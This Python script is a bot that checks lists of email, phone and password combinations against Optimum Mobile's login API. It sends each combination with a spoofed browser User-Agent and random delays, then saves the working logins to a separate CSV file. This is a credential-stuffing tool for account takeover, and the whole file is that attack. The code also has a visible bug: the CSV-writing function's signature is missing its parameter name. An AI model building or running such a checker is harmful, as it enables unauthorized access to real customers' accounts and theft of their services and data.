#!/usr/bin/env python3
"""
Optimum Mobile Credencial Validator Bot
Validates email/phone/password credentials against Optimum Mobile login
Separates valid and invalid credentials into separate CSV files
"""

import csv
import json
import logging
import random
import time
from pathlib import Path
from typing import Dict, List, Tuple
import requests
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/validator.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class OptimumValidator:
    """Bot para validar credenciales de Optimum Mobile"""

    def __init__(self, config_path: str = None):
        self.config = self._load_config(config_path)
        self.session = requests.Session()
        self.results = {
            'valid': [],
            'invalid': []
        }
        self._setup_session()

    def _load_config(self, config_path: str = None) -> Dict:
        """Load configuration from file or use defaults"""
        if config_path and Path(config_path).exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {
            'login_url': 'https://www.myoptimum.com/login',
            'api_endpoint': 'https://api.myoptimum.com/v1/auth/login',
            'timeout': 30,
            'retry_count': 3,
            'delay_min': 1,
            'delay_max': 3,
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
        }

    def _setup_session(self):
        """Setup session with consistent behavior"""
        self.session.headers.update(self.config.get('headers', {}))

    def validate_credential(self, email: str, phone: str, password: str) -> Tuple[bool, Dict]:
        """
        Validate a single credential pair against Optimum Mobile

        Returns: (is_valid, response_info)
        """
        payload = {
            'email': email,
            'phone': phone,
            'password': password
        }

        # Rate limiting delay
        delay = random.uniform(self.config['delay_min'], self.config['delay_max'])
        time.sleep(delay)

        max_retries = self.config['retry_count']
        last_error = None

        for attempt in range(max_retries):
            try:
                logger.info(f"Validando: {email} | Intento {attempt + 1}/{max_retries}")

                response = self.session.post(
                    self.config['api_endpoint'],
                    json=payload,
                    timeout=self.config['timeout']
                )

                response_json = response.json() if response.text else {}

                # Market research: Optimum often returns 200 with {'success': false} for invalid creds
                is_valid = response.status_code == 200 and response_json.get('success', False)
                message = response_json.get('message', str(response_json))

                info = {
                    'status_code': response.status_code,
                    'response': response_json,
                    'message': message,
                    'attempt': attempt + 1,
                    'timestamp': time.time()
                }

                if is_valid:
                    logger.info(f"✓ LOGIN EXITOSO: {email}")
                    return True, info
                else:
                    logger.warning(f"✗ CREDENCIALES INVÁLIDAS: {email} - {message}")
                    return False, info

            except json.JSONDecodeError as e:
                last_error = f"JSON decode error: {e}"
                logger.error(f"Error parsing response for {email}: {e}")
            except requests.Timeout:
                last_error = f"Timeout after {self.config['timeout']}s"
                logger.error(f"Timeout for {email}")
            except requests.RequestException as e:
                last_error = str(e)
                logger.error(f"Request error for {email}: {e}")
            except Exception as e:
                last_error = f"Unexpected error: {e}"
                logger.error(f"Unexpected error for {email}: {e}")

            if attempt < max_retries - 1:
                retry_delay = delay * (attempt + 1)  # Exponential backoff
                time.sleep(retry_delay)

        return False, {'error': last_error, 'attempt': max_retries}

    def load_credentials(self, file_path: str, format: str = 'csv') -> List[Dict]:
        """Load credentials from CSV or JSON file"""
        credentials = []

        try:
            if format.lower() == 'csv':
                with open(file_path, 'r', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    credentials = [row for row in reader]

                logger.info(f"✓ Cargados {len(credentials)} credenciales desde CSV")

            elif format.lower() == 'json':
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    credentials = [data] if isinstance(data, dict) else data

                logger.info(f"✓ Cargados {len(credentials)} credenciales desde JSON")

            else:
                raise ValueError(f"Formato no soportado: {format}")

            return credentials

        except FileNotFoundError:
            logger.error(f"✗ Archivo no encontrado: {file_path}")
            raise
        except Exception as e:
            logger.error(f"✗ Error al cargar archivo: {e}")
            raise

    def process_credentials(self, credentials: List[Dict]):
        """Process all credentials and classify results"""
        logger.info(f"=================================================")
        logger.info(f"Iniciando validación de {len(credentials)} credenciales")
        logger.info(f"=================================================")

        for idx, cred in enumerate(credentials, 1):
            # Handle different field name patterns
            email = cred.get('email') or cred.get('correo') or cred.get('Correo') or cred.get('EMAIL')
            phone = cred.get('phone') or cred.get('telefono') or cred.get('Telefono') or cred.get('PHONE')
            password = cred.get('password') or cred.get('pass') or cred.get('Password') or cred.get('PASSWORD')

            if not email or not password:
                logger.warning(f"✗ Faltan datos en línea {idx}: {cred}")
                self.results['invalid'].append({
                    **cred,
                    'status': 'ERROR - missing_fields',
                    'message': 'Faltan email o password'
                })
                continue

            logger.info(f"[{idx}/{len(credentials)}] Procesando: {email}")

            is_valid, response_info = self.validate_credential(email, phone, password)

            result = {
                'email': email,
                'phone': phone,
                'password': '***',  # Mask password in output
                'status': 'VALID' if is_valid else 'INVALID',
                'response': response_info
            }

            if is_valid:
                self.results['valid'].append(result)
            else:
                self.results['invalid'].append(result)

            logger.info(f"Progreso: {len(self.results['valid'])} válidas, {len(self.results['invalid'])} inválidas")

    def save_results(self, output_dir: str = 'data'):
        """Save valid and invalid credentials to separate CSV files"""
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)

        # Save valid credentials
        if self.results['valid']:
            valid_file = output_path / 'valid_credentials.csv'
            self._write_csv(valid_file, self.results['valid'])
            logger.info(f"✓ Resultados válidos guardados: {valid_file}")

        # Save invalid credentials
        if self.results['invalid']:
            invalid_file = output_path / 'invalid_credentials.csv'
            self._write_csv(invalid_file, self.results['invalid'])
            logger.info(f"✓ Resultados inválidos guardados: {invalid_file}")

        # Save summary
        self._save_summary()

    def _write_csv(self, file_path: Path, List[Dict]):
        """Write results to CSV"""
        if not data:
            return

        # Get all possible fields
        all_keys = set()
        for item in data:
            all_keys.update(item.keys())

        fieldnames = list(all_keys)

        with open(file_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for item in data:
                writer.writerow(item)

    def _save_summary(self):
        """Save summary report"""
        summary = {
            'total_processed': len(self.results['valid']) + len(self.results['invalid']),
            'valid_count': len(self.results['valid']),
            'invalid_count': len(self.results['invalid']),
            'success_rate': round(
                len(self.results['valid']) / (len(self.results['valid']) + len(self.results['invalid'])) * 100,
                2
            ) if (len(self.results['valid']) + len(self.results['invalid'])) > 0 else 0,
            'timestamp': time.time()
        }

        summary_file = Path('data') / 'validation_summary.json'
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        logger.info(f"=================================================")
        logger.info(f"RESUMEN")
        logger.info(f"=================================================")
        logger.info(f"Total procesadas: {summary['total_processed']}")
        logger.info(f"✓ Válidas: {summary['valid_count']}")
        logger.info(f"✗ Inválidas: {summary['invalid_count']}")
        logger.info(f"Tasa de éxito: {summary['success_rate']}%")
        logger.info(f"=================================================")

    def run(self, input_file: str, input_format: str = 'csv', output_dir: str = 'data'):
        """Run the validation process"""
        try:
            credentials = self.load_credentials(input_file, input_format)
            self.process_credentials(credentials)
            self.save_results(output_dir)

            return {
                'success': True,
                'valid_count': len(self.results['valid']),
                'invalid_count': len(self.results['invalid']),
                'total': len(self.results['valid']) + len(self.results['invalid'])
            }

        except Exception as e:
            logger.error(f"✗ Error durante ejecución: {e}")
            return {
                'success': False,
                'error': str(e)
            }


if __name__ == '__main__':
    import sys

    # Default paths
    default_config = '../config/validator_config.json'
    default_input = '../data/credentials.csv'

    config_path = sys.argv[1] if len(sys.argv) > 1 else default_config
    input_file = sys.argv[2] if len(sys.argv) > 2 else default_input
    input_format = sys.argv[3].lower() if len(sys.argv) > 3 else 'csv'

    # Create validator instance
    validator = OptimumValidator(config_path)

    # Run validation
    result = validator.run(input_file, input_format)

    if result['success']:
        logger.info("\n✓ Proceso completado exitosamente")
        sys.exit(0)
    else:
        logger.error(f"\n✗ Error en proceso: {result['error']}")
        sys.exit(1)